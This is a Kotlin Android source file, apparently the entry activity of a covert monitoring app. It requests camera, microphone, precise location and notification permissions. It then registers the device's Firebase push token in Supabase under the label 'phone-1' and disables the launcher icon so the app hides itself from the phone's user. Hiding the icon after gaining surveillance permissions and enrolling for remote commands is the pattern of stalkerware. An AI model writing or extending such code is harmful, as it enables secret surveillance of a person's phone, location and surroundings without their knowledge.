package com.ikianti.app

import android.Manifest
import android.content.ComponentName
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.firebase.messaging.ktx.messaging
import com.google.firebase.ktx.Firebase

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val REQUEST_PERMISSIONS = 1001
    }

    private val requiredPermissions = arrayOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.POST_NOTIFICATIONS
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val missing = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQUEST_PERMISSIONS)
        } else {
            finishSetup()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERMISSIONS) finishSetup()
    }

    private fun finishSetup() {
        // FCM-Token holen und in Supabase registrieren
        Firebase.messaging.token.addOnSuccessListener { token ->
            SupabaseApi.upsertDevice("phone-1", token) {
                Log.d(TAG, "Gerät in Supabase registriert")
                hideLauncherIcon()
                finish()
            }
        }.addOnFailureListener { e ->
            Log.e(TAG, "FCM-Token konnte nicht abgerufen werden", e)
            Toast.makeText(this, "Firebase-Verbindung prüfen!", Toast.LENGTH_LONG).show()
            hideLauncherIcon()
            finish()
        }
    }

    private fun hideLauncherIcon() {
        val alias = ComponentName(this, "com.ikianti.app.LauncherAlias")
        packageManager.setComponentEnabledSetting(
            alias,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        Log.d(TAG, "Launcher-Icon deaktiviert")
    }
}
